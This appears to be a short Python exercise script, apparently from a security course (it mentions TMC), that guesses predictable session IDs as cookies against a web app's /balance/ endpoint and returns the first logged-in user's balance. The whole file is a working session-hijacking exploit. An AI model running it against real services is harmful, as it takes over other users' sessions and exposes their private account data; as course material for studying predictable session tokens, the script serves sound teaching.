import sys
import requests
import json


def test_session(address):
	for i in range(1, 12):
		session_id = f'session-{i}'
		cookies = {'sessionid': session_id}

		r = requests.get(f'{address}/balance/', cookies=cookies)

		if r.status_code == 200:
			data = r.json()
			balance = data['balance']
			username = data['username']
			if username == 'anonymous':
				continue

			return balance

	return None



def main(argv):
	address = sys.argv[1]
	print(test_session(address))


# This makes sure the main function is not called immediatedly
# when TMC imports this module
if __name__ == "__main__": 
	if len(sys.argv) != 2:
		print('usage: python %s address' % sys.argv[0])
	else:
		main(sys.argv)
